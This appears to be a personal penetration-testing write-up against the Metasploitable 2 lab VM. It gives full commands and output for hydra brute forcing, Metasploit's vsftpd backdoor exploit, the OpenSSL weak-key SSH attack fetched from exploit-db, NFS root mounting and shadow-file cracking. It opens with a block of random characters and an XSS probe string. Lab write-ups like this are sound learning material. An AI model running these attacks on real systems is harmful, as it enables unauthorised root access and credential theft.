A2OXKNLsdndiptKc6ccaISIMuGOYgd4hpoWyepyerGdCbgzRdfzyuyFBqsy8l7cwaxopimHuOTI4J6mrskZ6pvvLsBlWIxegcCZRhrW4jgc4OMagNnTpBlApUbezYNDoBjCnvDRyqUHACV6Q2WgWoHpUqadFvSDadCUbOOjuJhIZDQx4OzMAN1NA2WAWaL5GCqYmp1vxM9l31HZGWhm4Id8NXpUpr7vnYBOal1sZED6VRtc9JFtN5ARJhrWrM9xy0OOWtANo3C36DdbQMcSvoYYhg10AyTt1FILdRLYu2dzqN8quEZdlu2VMQBgbaDlVY35sKZ2a7JodzXT41MRWACqQrfGCKT2pAbzV4kvWfzkaD5oWMwJJrADZ82HB1rSFyiecio5g2Ehzk5Bnx0kg3mjk75zUNMoNJ6QQ0mjlORThuVvm7gKQhbh9uXxbyQqZqrnIMO40XVuXWByMrRX7X2YCkGEeE4ttH6jqJD6QcfF1Gs2TpYV58ca688klMIm0UEJoqDjt1lg2tQre9x9RIyNTA1CdRubWQwlcqk795bMDmFTBjWW03saqsfgGdtxKd2hk9pxsN3mTz5rMHYaFgqWUdRldko0rDJLjzopgLlaqe7KbTdN3glHsrqQjI8YaYCGnWTgRFVeIxxm8kGJYxzkB1UGnnAHLgHSdybokKrSeHvqcgZyANpOsn3LGyLHAWutxxjw7L9rPpy8dhGD99zX06frRSiodCMNAsrHPJDFV4qrfAb39j0ydUP1mR50o7lsvhUO8U9oVr3zeUOQklOliV0GuQqQVhVYBYog2KRQpcwQEdr83ejAEd2mnciLORarxmKhbXCjBMcgOYgCDegh8Kgcx53Yi4SZoN9vBAGlCeJmdccU4Zu5Rv8Svqj87v94y4I6jiXn1mlSsck7xheRl8hnMjfFNxQCH4r5zteZZKTHkV6swHfRlGwU3P4s15W4qCPhQFRhZ9fAi8q2xWuHKSS5MfYJ2Wg8XcvxtUtb1Uxai7EDyXuKtsCdMu9ogm5CDSMt8caPdwwLXboE2Hztd592udpkTkYOoTasNXFGbdYsUW8aDUmbfq9l2WInz0K33EHeGGZWHVg0OZW1xfsE5wne2Ssj9VtNzmmKCx6D17DSgBH3mDm9eDJdeVBeHeEO5Zdup84SBU3k<script>alert(foo)</script>: Output from the phpinfo() function was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpMyAdmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8311 requests: 0 error(s) and 29 item(s) reported on remote host
+ End Time:           2018-07-28 18:02:01 (GMT-4) (42 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

We iddentify a number of sites and items of interest off the automated scan.
Visiting the site on port 80 using curl, we can see a link called DVWA to
`http://10.10.10.101/dvwa/login.php`

## Port 80 - Damn Vulnerable Web Application

The password hint is provided on the landing page as username `admin` and
password `password`. We login using these credential using a standard web
browser, the first vulnerability is at `http://10.10.10.101/dvwa/vulnerabilities/brute/`

### Brute Force

We can use hydra to attempt to brute force the login, but first we need to get
an error message that hydra will scan for to identify unsuccessful attempt. If
we just click on the Login button we get `Username and/or password incorrect.`
as the error message. The options used below wait (-w) 60 seconds for the page
to respond, and waits (-t) 5 seconds between requests, uses password spraying or reverse
brute force (-u), exit on the first match found (-f).

```
$hydra -l admin -P passwords.lst 10.10.10.101 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect." -w 60 -t 5 -u -f 
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-27 11:27:14
[DATA] max 5 tasks per 1 server, overall 5 tasks, 8 login tries (l:1/p:8), ~2 tries per task
[DATA] attacking http-get-form://10.10.10.101:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.
[80][http-get-form] host: 10.10.10.101   login: admin   password: password
[STATUS] attack finished for 10.10.10.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-03-27 11:27:15
```

### Command Execution

Entering the loop back address (127.0.0.1) seems to produce output from the ping command. The view source button at the bottom of the page reveals the source code.

```
<?php

if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST["ip"];
    
    $target = stripslashes( $target );
    
    
    // Split the IP into 4 octects
    $octet = explode(".", $target);
    
    // Check IF each octet is an integer
    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {
    
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
    
    
        // Determine OS and execute the ping command.
        if (stristr(php_uname('s'), 'Windows NT')) { 
    
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        } else { 
    
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        
        }
    
    }
    
    else {
        echo '<pre>ERROR: You have entered an invalid IP</pre>';
    }
    
    
}

?> 
```

We can append `&` and the next command we want to execute, however, according to the source code, the `$target` variable is split into 4 octets and each one evaluated to see if it is numeric, so we need to encode our command in such a way such that it passes the `is_numeric` test. We check the PHP function at `https://www.php.net/manual/en/function.is-numeric.php` in an attempt to understand it a bit better. Thought there might be a clue in the fact that since version 7 of PHP hexadecimal values are not is_numeric! After a couple of days of trying various injection to converst commands to numeric strings I gave up and looked at the source at `https://github.com/ethicalhack3r/DVWA/tree/master/vulnerabilities/exec/source` Looking that the different versions and the help file, the impossible.php is probably not exploitable.

### CSRF


## Port 111 et al.

RPCBind runs on both TCP and UDP ports 111, so ran a separate nmap scan against the port, since RPC bind glues the processes against the ports, we can use it to identify the processes.

```
root@kali:~# nmap -A -sT -sU -p 111 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 18:25 EDT
Nmap scan report for 10.10.10.101
Host is up (0.00098s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      34832/udp  mountd
|   100005  1,2,3      47474/tcp  mountd
|   100021  1,3,4      42100/udp  nlockmgr
|   100021  1,3,4      51622/tcp  nlockmgr
|   100024  1          34009/tcp  status
|_  100024  1          45223/udp  status
111/udp open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      34832/udp  mountd
|   100005  1,2,3      47474/tcp  mountd
|   100021  1,3,4      42100/udp  nlockmgr
|   100021  1,3,4      51622/tcp  nlockmgr
|   100024  1          34009/tcp  status
|_  100024  1          45223/udp  status
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.98 ms 10.10.10.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds
```

## Port 2049

For some reason the showmount commnand is missing from Kali, and whilst looking for is using dpks -S showmount, I located an nmap script for showing exported mount points. I executed the script against port 111.

```
root@kali:~# nmap --script /usr/share/nmap/scripts/nfs-showmount.nse -p 111 -n -v 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 15:00 AEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Initiating ARP Ping Scan at 15:00
Scanning 10.10.10.101 [1 port]
Completed ARP Ping Scan at 15:00, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:00
Scanning 10.10.10.101 [1 port]
Discovered open port 111/tcp on 10.10.10.101
Completed SYN Stealth Scan at 15:00, 0.03s elapsed (1 total ports)
NSE: Script scanning 10.10.10.101.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.03s elapsed
Nmap scan report for 10.10.10.101
Host is up (0.00046s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  / *
MAC Address: 00:0C:29:FA:DD:2A (VMware)

NSE: Script Post-scanning.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
root@kali:~# 
```

It appears that the root directory (/) is exported to all hosts (*).

## Port 139 and 445

The initial port scan indicated that Samba was running on the target host and port 139 and 445 were open. We can attempt to connect to the host and list shares

```
root@kali:~# smbclient -L 10.10.10.101
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            METASPLOITABLE
root@kali:~# 
```

## Port 512-514

Unix r-services are common to commercial platforms, including Solaris, HP-UX, and AIX, but fortunately also available on the Metasploitable target machine. Each r-service runs using standard PAM username and password authentication, which is overridden by ~/.rhosts and /etc/hosts.equiv entries defining trusted hosts and usernames. From a Unix-based platform, you use rsh, rlogin, and rexec clients to access the respective r-services running on a remote host. (Refer: http://etutorials.org/Networking/network+security+assessment/Chapter+7.+Assessing+Remote+Maintenance+Services/7.4+R-Services/) Since we have a list of metasploitable names we can try using them to see if we have any misconfigured.

Searched the web for exploits against rshd. Although https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rsh_login was very popular, the scanner did not yield any successful results.

## Port 1099

Appears to be Java RMI server. RMI allows instances of Java classes (objects) in one JVM to invoke methods for objects in another JVM. RMI also allows classes to be loaded from remote sources and instantiated within the JVM.

```
root@kali:~# nmap -n -vv -p 1099 -A 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-06 19:53 AEST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Initiating ARP Ping Scan at 19:53
Scanning 10.10.10.101 [1 port]
Completed ARP Ping Scan at 19:53, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:53
Scanning 10.10.10.101 [1 port]
Discovered open port 1099/tcp on 10.10.10.101
Completed SYN Stealth Scan at 19:53, 0.03s elapsed (1 total ports)
Initiating Service scan at 19:53
Scanning 1 service on 10.10.10.101
Completed Service scan at 19:53, 6.01s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.10.101
NSE: Script scanning 10.10.10.101.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.05s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Nmap scan report for 10.10.10.101
Host is up, received arp-response (0.00064s latency).
Scanned at 2018-08-06 19:53:25 AEST for 7s

PORT     STATE SERVICE  REASON         VERSION
1099/tcp open  java-rmi syn-ack ttl 64 Java RMI Registry
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=8/6%OT=1099%CT=%CU=31796%PV=Y%DS=1%DC=D%G=N%M=000C29%T
OS:M=5B681A9C%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=D5%TI=Z%CI=Z%II=I%T
OS:S=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=
OS:M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1
OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW5%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11
OS:NW5%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 1.976 days (since Sat Aug  4 20:27:59 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=205 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: localhost

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 10.10.10.101

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
           Raw packets sent: 21 (1.670KB) | Rcvd: 18 (1.434KB)
root@kali:~# 
```
We can try and find Java RMI relate modules in Metasploit and run them, enumerate user
```
msf > search java_rmi

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/gather/java_rmi_registry                               normal     Java RMI Registry Interfaces Enumeration
   auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     Java RMI Server Insecure Endpoint Code Execution Scanner
   exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  Java RMIConnectionImpl Deserialization Privilege Escalation
   exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution


msf > use auxiliary/gather/java_rmi_registry
msf auxiliary(gather/java_rmi_registry) > show options

Module options (auxiliary/gather/java_rmi_registry):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  1099             yes       The target port (TCP)

msf auxiliary(gather/java_rmi_registry) > set RHOST 10.10.10.101
RHOST => 10.10.10.101
msf auxiliary(gather/java_rmi_registry) > run

[*] 10.10.10.101:1099 - Sending RMI Header...
[*] 10.10.10.101:1099 - Listing names in the Registry...
[-] 10.10.10.101:1099 - Names not found in the Registry
[*] Auxiliary module execution completed
msf auxiliary(gather/java_rmi_registry) > back
msf > set RHOST 10.10.10.101
RHOST => 10.10.10.101
msf > use auxiliary/scanner/misc/java_rmi_server
msf auxiliary(scanner/misc/java_rmi_server) > show options

Module options (auxiliary/scanner/misc/java_rmi_server):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    1099             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf auxiliary(scanner/misc/java_rmi_server) > set RHOSTS 10.10.10.101
RHOSTS => 10.10.10.101
msf auxiliary(scanner/misc/java_rmi_server) > set THREADS 32
THREADS => 32
msf auxiliary(scanner/misc/java_rmi_server) > run

[+] 10.10.10.101:1099     - 10.10.10.101:1099 Java RMI Endpoint Detected: Class Loader Enabled
[*] 10.10.10.101:1099     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/misc/java_rmi_server) > 
```
## Port 1524

According to nmap this is a bindshell for Metasploit. Could not find any vulnerabilities associated with this, but literature on the web suggests that a simple telnet to the port is sufficient to gain root access on the target.

## Port 2121

We identify ProFTP running on the target and listening on port 2121.

```
root@kali:~# nmap -A -sV -p2121 10.10.10.101
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-06 23:12 AEST
Nmap scan report for 10.10.10.101
Host is up (0.00068s latency).

PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.1
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms 10.10.10.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.37 seconds
```

Searching the web for ProFTP vulnerabilities, we can find https://www.cvedetails.com/vulnerability-list/vendor_id-9520/product_id-16873/version_id-72426/Proftpd-Proftpd-1.3.1.html. We search for any potential exploits within metasploit again proftp, and come up with this.

```
msf > search proftp

Matching Modules
================

   Name                                         Disclosure Date  Rank       Description
   ----                                         ---------------  ----       -----------
   exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   exploit/linux/ftp/proftp_sreplace            2006-11-26       great      ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    NetSupport Manager Agent Remote Buffer Overflow
   exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  ProFTPD-1.3.3c Backdoor Command Execution
   exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  ProFTPD 1.3.5 Mod_Copy Command Execution
   exploit/windows/ftp/proftp_banner            2009-08-25       normal     ProFTP 2.9 Banner Remote Buffer Overflow
```

I cannot find anything specific to version 1.3.1, so this may be a candidate for a brute force attempt using our username and cracked passwords list.

## Port 3306

Port 3306 is usually used by MySQL. We can confirm this using nmap
```
root@kali:~# nmap -p 3306 -A 10.10.10.101 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-07 02:03 AEST
Nmap scan report for 10.10.10.101
Host is up (0.00098s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 10
|   Capabilities flags: 43564
|   Some Capabilities: SupportsCompression, Support41Auth, Speaks41ProtocolNew, LongColumnFlag, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsTransactions
|   Status: Autocommit
|_  Salt: C3tqYMR4K^w^NNz?it*n
MAC Address: 00:0C:29:FA:DD:2A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.98 ms 10.10.10.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.29 seconds
root@kali:~# 
```

A search for vulnerabilities in this version of MySQL we can find https://www.cvedetails.com/vulnerability-list/vendor_id-185/product_id-316/version_id-61896/Mysql-Mysql-5.0.51a.html, as well as https://www.exploit-db.com/exploits/19092/

## Port 3632

## Port 5432

## Port 5900

## Port 6000

## Port 6667

## Port 6697

## Port 8009

## Port 8180

## Port 8787

## Port 34009

## Port 35709

## Port 47474

## Port 51622

# Exploitation

The exploitation of the services using the Metasploit framework is summarised below.

## Port 21
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.101
RHOST => 10.10.10.101
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  10.10.10.101     yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.101:21 - USER: 331 Please specify the password.
[+] 10.10.10.101:21 - Backdoor service has been spawned, handling...
[+] 10.10.10.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.10.10.100:45063 -> 10.10.10.101:6200) at 2018-07-27 12:24:57 -0400

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

## Port 22

Attempted to check if SSH was vulnerable to using a known blacklisted key pair.
```
root@kali:~/metasploitable2/5662# wget https://www.exploit-db.com/download/5720.py -O 5720.py 
--2018-07-28 16:18:23--  https://www.exploit-db.com/download/5720.py
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4353 (4.3K) [application/txt]
Saving to: �5720.py�

5720.py                          100%[=======================================================>]   4.25K  --.-KB/s    in 0s      

2018-07-28 16:18:24 (38.4 MB/s) - �5720.py� saved [4353/4353]

root@kali:~/metasploitable2/5662#
root@kali:~/metasploitable2/5622# wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 -O 5622.tar.bz2
--2018-07-28 16:19:43--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
Resolving github.com (github.com)... 192.30.255.112, 192.30.255.113
Connecting to github.com (github.com)|192.30.255.112|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/bin-sploits/5622.tar.bz2 [following]
--2018-07-28 16:19:44--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/bin-sploits/5622.tar.bz2
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.96.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.96.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 50226987 (48M) [application/octet-stream]
Saving to: �5622.tar.bz2�

5622.tar.bz2                     100%[=======================================================>]  47.90M  2.16MB/s    in 22s     

2018-07-28 16:20:25 (2.17 MB/s) - �5622.tar.bz2� saved [50226987/50226987]

root@kali:~/metasploitable2/5622# bunzip2 5622.tar.bz2 
root@kali:~/metasploitable2/5622# tar xvf 5622.tar 
rsa/
rsa/2048/
rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
<snip>
root@kali:~/metasploitable2/5622# python 5720.py rsa/2048/ 10.10.10.101 root 22 20

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 110 keys | Remaining 32658 keys | Aprox. Speed 22/sec
Tested 224 keys | Remaining 32544 keys | Aprox. Speed 22/sec
Tested 337 keys | Remaining 32431 keys | Aprox. Speed 22/sec
<snip>
Tested 9330 keys | Remaining 23438 keys | Aprox. Speed 29/sec
Tested 9445 keys | Remaining 23323 keys | Aprox. Speed 23/sec
Tested 9556 keys | Remaining 23212 keys | Aprox. Speed 22/sec

Key Found in file: 57c3115d77c56390332dc5c49978627a-5429
Execute: ssh -lroot -p22 -i rsa/2048//57c3115d77c56390332dc5c49978627a-5429 10.10.10.101

Tested 9618 keys | Remaining 23150 keys | Aprox. Speed 12/sec
root@kali:~/metasploitable2/5622#
root@kali:~/metasploitable2/5622# ssh -lroot -p22 -i rsa/2048//57c3115d77c56390332dc5c49978627a-5429 10.10.10.101
Last login: Fri Jul 27 07:38:09 2018 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# hostname
metasploitable
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:~#
```

## Port 23
```
msf > use auxiliary/scanner/telnet/telnet_version
msf auxiliary(scanner/telnet/telnet_version) > show options

Module options (auxiliary/scanner/telnet/telnet_version):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS    10.10.10.101/32  yes       The target address range or CIDR identifier
   RPORT     23               yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads
   TIMEOUT   30               yes       Timeout for the Telnet probe
   USERNAME                   no        The username to authenticate as

msf auxiliary(scanner/telnet/telnet_version) > run

[+] 10.10.10.101:23       - 10.10.10.101:23 TELNET _                  _       _ _        _     _      ____  \x0a _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ \x0a| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |\x0a| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ \x0a|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|\x0a                            |_|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
[*] 10.10.10.101:23       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/telnet/telnet_version) > creds add user:msfadmin password:msfadmin
msf auxiliary(scanner/telnet/telnet_version) > creds
Credentials
===========

host  origin  service  public    private   realm  private_type
----  ------  -------  ------    -------   -----  ------------
                       msfadmin  msfadmin         Password

msf auxiliary(scanner/telnet/telnet_version) >
```

Grabbing the banner for the Telnet service we are given out login hints msfadmin and msfadmin. We add these credentials to the Metasploit creds

We can also create a usernames (/root/msfusers.txt) and passwords (/root/msfpasswords.txt) file containing these credentials for testing brute force attempts.

## Port 25

We can use metasploit to attempt to enumerate some of the users, and add the identified account to our users file
```
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS     10.10.10.101/32                                                yes       The target address range or CIDR identifier
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    256                                                            yes       The number of concurrent threads
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.10.101:25       - 10.10.10.101:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[+] 10.10.10.101:25       - 10.10.10.101:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, news, nobody, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
[*] 10.10.10.101:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/smtp/smtp_enum) >
```

We have enumerated some of the common unix users available on the host, we can create a list of username to be used for future scans and exploit attempts. We also have the initial password. We maintain the users list in a file called msfusers.txt for future use.

## Port 111 et al.

To get the showmount command on kali, you need to run apt-get install nfs-common with elevated privileges. Since the root directory (/) is exported to all hosts (*), we can attempt to mount the file system remotely. mount -t nfs 10.10.10.101:/ /mnt. We essentially have root access to the file system, and can make whatever changes required, including uploading new SSH keys to be able to SSH onto the servers. Since we can read file, we can take a look at sensitive files such as configuration files, including/etc/passwd and /etc/shadow and attempting to cracking the passwords.
```
root@kali:~# unshadow passwd shadow > unshadowed
root@kali:~# john -wordlist:/usr/share/metasploit-framework/data/wordlists/password.lst unshadowed 
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
